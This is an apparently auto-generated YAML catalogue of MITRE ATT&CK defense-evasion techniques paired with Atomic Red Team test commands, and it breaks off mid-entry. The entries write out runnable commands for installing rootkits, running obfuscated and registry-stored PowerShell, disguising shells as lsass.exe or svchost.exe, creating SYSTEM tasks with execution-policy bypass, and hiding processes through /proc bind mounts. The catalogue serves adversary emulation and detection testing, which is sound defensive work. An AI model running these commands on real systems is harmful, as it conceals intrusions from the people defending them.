# AutoStrike MITRE ATT&CK Techniques - defense-evasion
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1006
  name: Direct Volume Access
  description: |-
    Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

    Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Gith...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Read volume boot sector via DOS device path (PowerShell)
      type: powershell
      platform: windows
      command: |-
        $buffer = New-Object byte[] 11
        $handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
        $handle.Read($buffer, 0, $buffer.Length)
        $handle.Close()
        Format-Hex -InputObject $buffer
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1006
  is_safe: false
- id: T1014
  name: Rootkit
  description: "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor or [System Firmware](https:..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Loadable Kernel Module based Rootkit
      type: sh
      platform: linux
      command: sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko
      cleanup: |-
        sudo rmmod T1014
        sudo rm -rf PathToAtomicsFolder/T1014/bin
      timeout: 60
      elevation_required: true
    - name: Loadable Kernel Module based Rootkit (2)
      type: sh
      platform: linux
      command: sudo modprobe T1014
      cleanup: |-
        sudo modprobe -r T1014
        sudo rm /lib/modules/$(uname -r)/T1014.ko
        sudo depmod -a
      timeout: 60
      elevation_required: true
    - name: dynamic-linker based rootkit (libprocesshider)
      type: sh
      platform: linux
      command: |-
        echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
        /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
      cleanup: |-
        sed -i "\:^/usr/local/lib/libprocesshider.so:d" /etc/ld.so.preload
        rm -rf /usr/local/lib/libprocesshider.so /usr/local/bin/evil_script.py /tmp/atomic
      timeout: 60
      elevation_required: true
    - name: Loadable Kernel Module based Rootkit (Diamorphine)
      type: sh
      platform: linux
      command: |-
        sudo modprobe diamorphine
        ping -c 10 localhost >/dev/null & TARGETPID="$!"
        ps $TARGETPID
        kill -31 $TARGETPID
        ps $TARGETPID || echo "process ${TARGETPID} hidden"
      cleanup: |-
        kill -63 1
        sudo modprobe -r diamorphine
        sudo rm -rf /lib/modules/$(uname -r)/diamorphine.ko /tmp/atomic
        sudo depmod -a
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1014
  is_safe: false
- id: T1027
  name: Obfuscated Files or Information
  description: "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Decode base64 Data into Script
      type: sh
      platform: macos
      command: |-
        if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
        cat /tmp/encoded.dat | $cmd > /tmp/art.sh
        chmod +x /tmp/art.sh
        /tmp/art.sh
      cleanup: "rm /tmp/encoded.dat \nrm /tmp/art.sh"
      timeout: 60
    - name: Decode base64 Data into Script
      type: sh
      platform: linux
      command: |-
        if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
        cat /tmp/encoded.dat | $cmd > /tmp/art.sh
        chmod +x /tmp/art.sh
        /tmp/art.sh
      cleanup: "rm /tmp/encoded.dat \nrm /tmp/art.sh"
      timeout: 60
    - name: Execute base64-encoded PowerShell
      type: powershell
      platform: windows
      command: |-
        $OriginalCommand = 'Write-Host "Hey, Atomic!"'
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
        $EncodedCommand =[Convert]::ToBase64String($Bytes)
        $EncodedCommand
        powershell.exe -EncodedCommand $EncodedCommand
      timeout: 120
    - name: Execute base64-encoded PowerShell from Windows Registry
      type: powershell
      platform: windows
      command: |-
        $OriginalCommand = 'Write-Host "Hey, Atomic!"'
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
        $EncodedCommand =[Convert]::ToBase64String($Bytes)
        $EncodedCommand

        Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
        powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"
      cleanup: Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug
      timeout: 120
    - name: Execution from Compressed File
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"'
      cleanup: |-
        taskkill /f /im calculator.exe >nul 2>nul
        taskkill /f /im CalculatorApp.exe >nul 2>nul
      timeout: 120
    - name: DLP Evasion via Sensitive Data in VBA Macro over email
      type: powershell
      platform: windows
      command: Send-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments "PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm" -SmtpServer 127.0.0.1
      timeout: 120
    - name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
      type: powershell
      platform: windows
      command: Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm"
      timeout: 120
    - name: Obfuscated Command in PowerShell
      type: powershell
      platform: windows
      command: $cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
      timeout: 120
    - name: Snake Malware Encrypted crmlog file
      type: powershell
      platform: windows
      command: '$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = ''Hidden'', ''System'', ''Archive''; Write-Host "File created: $($file.FullName)"'
      cleanup: '$fileNameToDelete = ''04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog''; $filePathToDelete = "$env:windir\registration\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host "File deleted: $fullPathToDelete" } else { Write-Host "File not found: $fullPathToDelete" }'
      timeout: 120
      elevation_required: true
    - name: Execution from Compressed JScript File
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"'
      cleanup: taskkill /f /im calculator.exe >nul 2>nul
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1027
  is_safe: false
- id: T1027.001
  name: Binary Padding
  description: "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is..."
  tactic: defense-evasion
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Pad Binary to Change Hash - Linux/macOS dd
      type: sh
      platform: linux
      command: |-
        dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
        dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
        dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
      cleanup: rm /tmp/evil-binary
      timeout: 60
    - name: Pad Binary to Change Hash - Linux/macOS dd
      type: sh
      platform: macos
      command: |-
        dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
        dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
        dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data
      cleanup: rm /tmp/evil-binary
      timeout: 60
    - name: Pad Binary to Change Hash using truncate command - Linux/macOS
      type: sh
      platform: linux
      command: 'truncate -s +1 /tmp/evil-binary #adds a byte to the file size'
      cleanup: rm /tmp/evil-binary
      timeout: 60
    - name: Pad Binary to Change Hash using truncate command - Linux/macOS
      type: sh
      platform: macos
      command: 'truncate -s +1 /tmp/evil-binary #adds a byte to the file size'
      cleanup: rm /tmp/evil-binary
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1027/001
  is_safe: false
- id: T1027.002
  name: Software Packing
  description: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Binary simply packed by UPX (linux)
      type: sh
      platform: linux
      command: cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx /tmp/packed_bin && /tmp/packed_bin
      cleanup: rm /tmp/packed_bin
      timeout: 60
    - name: Binary packed by UPX, with modified headers (linux)
      type: sh
      platform: linux
      command: cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin
      cleanup: rm /tmp/packed_bin
      timeout: 60
    - name: Binary simply packed by UPX
      type: sh
      platform: macos
      command: cp PathToAtomicsFolder/T1027.002/bin/darwin/test_upx /tmp/packed_bin && /tmp/packed_bin
      cleanup: rm /tmp/packed_bin
      timeout: 60
    - name: Binary packed by UPX, with modified headers
      type: sh
      platform: macos
      command: cp PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin
      cleanup: rm /tmp/packed_bin
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1027/002
  is_safe: false
- id: T1027.004
  name: Compile After Delivery
  description: |-
    Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

    Source code payloads may also be encrypted, encoded, and/or embedded ...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Compile After Delivery using csc.exe
      type: cmd
      platform: windows
      command: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\T1027.004.exe "PathToAtomicsFolder\T1027.004\src\calc.cs"
      cleanup: del C:\Windows\Temp\T1027.004.exe >nul 2>&1
      timeout: 120
    - name: Dynamic C# Compile
      type: powershell
      platform: windows
      command: Invoke-Expression "PathToAtomicsFolder\T1027.004\bin\T1027.004_DynamicCompile.exe"
      timeout: 120
    - name: C compile
      type: sh
      platform: linux
      command: |-
        gcc PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out
        clang PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out
      timeout: 60
    - name: C compile
      type: sh
      platform: macos
      command: |-
        gcc PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out
        clang PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out
      timeout: 60
    - name: CC compile
      type: sh
      platform: linux
      command: |-
        g++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out
        clang++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out
      timeout: 60
    - name: CC compile
      type: sh
      platform: macos
      command: |-
        g++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out
        clang++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out
      timeout: 60
    - name: Go compile
      type: sh
      platform: linux
      command: go run PathToAtomicsFolder/T1027.004/src/T1027-004-test.go
      timeout: 60
    - name: Go compile
      type: sh
      platform: macos
      command: go run PathToAtomicsFolder/T1027.004/src/T1027-004-test.go
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1027/004
  is_safe: false
- id: T1027.006
  name: HTML Smuggling
  description: Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Cit...
  tactic: defense-evasion
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: HTML Smuggling Remote Payload
      type: powershell
      platform: windows
      command: '& "PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html"'
      cleanup: $user = [System.Environment]::UserName; Remove-Item -Path C:\Users\$user\Downloads\FeelTheBurn.iso -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1027/006
  is_safe: false
- id: T1027.007
  name: Dynamic API Resolution
  description: |-
    Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

    API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also un...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Dynamic API Resolution-Ninja-syscall
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1027.007\bin\ninja_syscall1.exe"
        Start-Sleep -Seconds 7
        if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+] hello.log removed." }
      cleanup: if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+] hello.log removed." }
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1027/007
  is_safe: false
- id: T1027.013
  name: Encrypted/Encoded File
  description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Enc...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Decode Eicar File and Write to File
      type: powershell
      platform: windows
      command: |-
        $encodedString = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        $bytes = [System.Convert]::FromBase64String($encodedString)
        $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)

        #write the decoded eicar string to file
        $decodedString | Out-File T1027.013_decodedEicar.txt
      cleanup: Just delete the resulting T1027.013_decodedEicar.txt file.
      timeout: 120
    - name: Decode Eicar File and Write to File
      type: powershell
      platform: macos
      command: |-
        $encodedString = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        $bytes = [System.Convert]::FromBase64String($encodedString)
        $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)

        #write the decoded eicar string to file
        $decodedString | Out-File T1027.013_decodedEicar.txt
      cleanup: Just delete the resulting T1027.013_decodedEicar.txt file.
      timeout: 120
    - name: Decode Eicar File and Write to File
      type: powershell
      platform: linux
      command: |-
        $encodedString = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        $bytes = [System.Convert]::FromBase64String($encodedString)
        $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)

        #write the decoded eicar string to file
        $decodedString | Out-File T1027.013_decodedEicar.txt
      cleanup: Just delete the resulting T1027.013_decodedEicar.txt file.
      timeout: 120
    - name: Decrypt Eicar File and Write to File
      type: powershell
      platform: windows
      command: |-
        $encryptedString = "76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA="
        $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32

        $decrypt = ConvertTo-SecureString -String $encryptedString -Key $key
        $decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))

        #Write the decrypted eicar string to a file
        $decryptedString | out-file T1027.013_decryptedEicar.txt
      cleanup: Just delete the resulting T1027.013_decryptedEicar.txt file.
      timeout: 120
    - name: Decrypt Eicar File and Write to File
      type: powershell
      platform: macos
      command: |-
        $encryptedString = "76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA="
        $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32

        $decrypt = ConvertTo-SecureString -String $encryptedString -Key $key
        $decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))

        #Write the decrypted eicar string to a file
        $decryptedString | out-file T1027.013_decryptedEicar.txt
      cleanup: Just delete the resulting T1027.013_decryptedEicar.txt file.
      timeout: 120
    - name: Decrypt Eicar File and Write to File
      type: powershell
      platform: linux
      command: |-
        $encryptedString = "76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA="
        $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32

        $decrypt = ConvertTo-SecureString -String $encryptedString -Key $key
        $decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))

        #Write the decrypted eicar string to a file
        $decryptedString | out-file T1027.013_decryptedEicar.txt
      cleanup: Just delete the resulting T1027.013_decryptedEicar.txt file.
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1027/013
  is_safe: false
- id: T1036
  name: Masquerading
  description: |-
    Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

    Renaming abusable system utilities to evade security monitor...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: System File Copied to Unusual Location
      type: powershell
      platform: windows
      command: "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null"
      cleanup: remove-item "$env:allusersprofile\cmd.exe" -force -erroraction silentlycontinue
      timeout: 120
    - name: Malware Masquerading and Execution from Zip File
      type: powershell
      platform: windows
      command: |-
        Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\T1036.zip" -DestinationPath "$env:userprofile\Downloads\T1036" -Force
        cd "$env:userprofile\Downloads\T1036"
        cmd /c "$env:userprofile\Downloads\T1036\README.cmd" >$null 2>$null
      cleanup: |-
        taskkill /IM Calculator.exe /f >$null 2>$null
        Remove-Item "$env:userprofile\Downloads\T1036" -recurse -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1036
  is_safe: false
- id: T1036.003
  name: Rename Legitimate Utilities
  description: 'Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be po...'
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Masquerading as Windows LSASS process
      type: cmd
      platform: windows
      command: |-
        copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
        %SystemRoot%\Temp\lsass.exe /B
      cleanup: del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
      timeout: 120
    - name: Masquerading as FreeBSD or Linux crond process.
      type: sh
      platform: linux
      command: |-
        cp /bin/sh /tmp/crond;
        echo 'sleep 5' | /tmp/crond
      cleanup: rm /tmp/crond
      timeout: 60
    - name: Masquerading - cscript.exe running as notepad.exe
      type: cmd
      platform: windows
      command: |-
        copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
        cmd.exe /c %APPDATA%\notepad.exe /B
      cleanup: del /Q /F %APPDATA%\notepad.exe >nul 2>&1
      timeout: 120
    - name: Masquerading - wscript.exe running as svchost.exe
      type: cmd
      platform: windows
      command: |-
        copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
        cmd.exe /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
      cleanup: del /Q /F %APPDATA%\svchost.exe >nul 2>&1
      timeout: 120
    - name: Masquerading - powershell.exe running as taskhostw.exe
      type: cmd
      platform: windows
      command: |-
        copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
        cmd.exe /K %APPDATA%\taskhostw.exe
      cleanup: del /Q /F %APPDATA%\taskhostw.exe >nul 2>&1
      timeout: 120
    - name: Masquerading - non-windows exe running as windows exe
      type: powershell
      platform: windows
      command: |-
        copy "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe" ($env:TEMP + "\svchost.exe")
        try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id }
        catch { $_; exit $_.Exception.HResult}
        Stop-Process -ID $myT1036_003
      cleanup: Remove-Item ($env:TEMP + "\svchost.exe") -Force -ErrorAction Ignore
      timeout: 120
    - name: Masquerading - windows exe running as different windows exe
      type: powershell
      platform: windows
      command: |-
        copy "$env:ComSpec" ($env:TEMP + "\svchost.exe")
        $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + "\svchost.exe")).Id
        Stop-Process -ID $myT1036_003
      cleanup: Remove-Item ($env:TEMP + "\svchost.exe") -Force -ErrorAction Ignore
      timeout: 120
    - name: Malicious process Masquerading as LSM.exe
      type: cmd
      platform: windows
      command: |-
        copy C:\Windows\System32\cmd.exe C:\lsm.exe
        C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
      cleanup: |-
        del C:\T1036.003.txt >nul 2>&1
        del C:\lsm.exe >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1036/003
  is_safe: false
- id: T1036.004
  name: Masquerade Task or Service
  description: 'Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to th...'
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Creating W32Time similar named service using schtasks
      type: cmd
      platform: windows
      command: |-
        schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
        schtasks /query /tn win32times
      cleanup: schtasks /tn win32times /delete /f
      timeout: 120
      elevation_required: true
    - name: Creating W32Time similar named service using sc
      type: cmd
      platform: windows
      command: |-
        sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"
        sc qc win32times
      cleanup: sc delete win32times
      timeout: 120
      elevation_required: true
    - name: linux rename /proc/pid/comm using prctl
      type: sh
      platform: linux
      command: |-
        /tmp/T1036_004_prctl_rename & ps
        TMP=`ps | grep totally_legit`
        if [ -z "${TMP}" ] ; then echo "renamed process NOT FOUND in process list" && exit 1; fi
        exit 0
      cleanup: rm -f /tmp/T1036_004_prctl_rename
      timeout: 60
    - name: Hiding a malicious process with bind mounts
      type: sh
      platform: linux
      command: |-
        eval '(while true; do :; done) &'
        echo $! > /tmp/evil_pid.txt
        random_kernel_pid=$(ps -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1)
        sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)
      cleanup: |-
